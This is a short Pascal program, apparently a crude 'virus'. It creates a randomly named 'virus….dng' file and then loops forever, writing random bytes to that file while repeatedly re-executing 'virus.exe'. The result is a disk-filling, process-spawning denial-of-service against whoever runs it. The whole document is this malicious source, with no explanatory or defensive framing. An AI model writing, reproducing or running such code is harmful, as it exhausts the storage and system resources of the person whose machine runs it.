uses crt, dos;
var c:string;
    i:longint;
    f:text;
begin
    {$I-}
    repeat
        randomize;
        c := '';
        for i:=1 to 25 do
        c := c+char(65+random(25));
        assign(f,'virus'+c+'.dng');
        reset(f);
    until IOresult <> 0;
    rewrite(f);
    repeat
        write(f,char(random(255)));
        exec('virus.exe','10101');
    until 1=2;
    close(output);
end.
